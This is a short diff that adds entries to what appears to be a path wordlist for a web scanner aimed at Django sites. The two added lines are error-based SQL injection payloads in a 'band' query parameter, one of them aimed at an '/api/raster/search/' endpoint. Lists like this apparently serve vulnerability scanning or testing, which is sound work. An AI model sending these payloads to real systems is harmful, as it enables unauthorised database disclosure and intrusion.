@@ -6,3 +6,5 @@
 /web/settings/settings.py
 /{{app_name}}/settings.py
 /admin/login/?next=/admin/
+/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+/api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
